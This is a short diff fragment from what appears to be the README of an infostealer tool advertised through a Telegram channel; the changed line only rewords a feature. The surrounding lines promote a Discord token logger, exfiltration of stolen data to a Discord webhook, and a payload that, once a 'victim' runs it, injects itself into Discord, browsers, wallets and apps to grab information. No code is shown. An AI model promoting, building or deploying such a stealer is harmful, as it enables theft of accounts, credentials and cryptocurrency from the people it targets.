@@ -27,7 +27,7 @@ MORE FEATURES AVAILABLE ON https://t.me/BPLogger
 
 • Discord Token Logger
 
-• Send data to your CS2 Discord Webhook
+• Send data to your Discord Webhook
 
 • Once the victim executes the payload, it will inject itself into discord, browsers, wallets, apps, etc and find information to grab.
 
